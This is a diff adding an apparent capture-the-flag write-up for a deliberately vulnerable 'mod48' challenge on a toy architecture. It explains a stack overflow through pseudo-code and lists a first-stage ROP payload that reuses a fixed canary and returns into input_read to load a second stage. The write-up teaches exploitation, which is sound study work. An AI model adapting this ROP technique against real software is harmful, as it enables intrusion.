@@ -1,0 +1,61 @@
+mod48 is a non-intuitive stack-buffer-overflow requiring a bit of ROP to
+exploit
+
+main calls function mod48, which is encapsulated in this pseudo-code
+
+1:  mod64 ()
+2:  {
+3:     set_stack_canary(0x000a);
+4: 
+5:     puts("Entry string to mod 48: ")
+6:
+7:     bytes_read = read(0, 0x8000, 256);
+8:     length     = strlen(0x8000);
+9:     buf        = alloca(length);
+10:    memcpy(buf, 0x8000, bytes_read);
+11:
+12:    check_stack_canary(0x000a);
+13:    memset(0x8000, 0, bytes_read);
+14:
+15:    for (i = 0; i < bytes_read; i++) {
+16:        buf[i] = buf[i] % 48;
+17:    }
+18:
+19:    for (i = 0; i < length; i++) {
+20:        putchar(buf[i]);
+21:    }
+22: }
+
+The attacker can write on the stack with values < 0x40. This limits what the
+attacker can do. The attacker cannot, for example, return into shellcode on
+the stack. The attacker is also very limited in the shellcode he can place.
+The instructions: IN, OUT, PUSH, POP, MOV, CMP, HLT, SYSCALL, LOAD, STOR and
+NOP all have encodings >= 0x30.
+
+The bytes_read = read(0, 0x8000, 256) on line 7 is actually a call to a
+function input_read. The definition of input_read is:
+void input_read(unsigned char * buf, uint16 buf_size);
+
+input_read is located at address 0x022E. This function was placed here on
+purpose, as it is a valid return location.
+
+If we set up our stack correctly, we can return to input_read, read our
+shellcode into a new location, and then return to that location.
+
+We should send the following bytes as input for our first stage of mod64:
+
+0x0000 # pop r7
+0x0000 # pop r6
+0x0000 # pop r5
+0x0000 # pop r3
+0x0000 # pop r2
+0x0000 # pop r1
+0x000A # stack canary
+0x0000 # rbp
+0x022E # Address of input_read()
+0x2000 # RET address from input_read to stage 2
+0x2000 # arg0 to input_read()
+0x0400 # arg1 to input_read()
+
+This will prompt us for a second stage which will be read in at address 0x2000.
+After we have read stage 2 to this address, we will return to 0x2000.
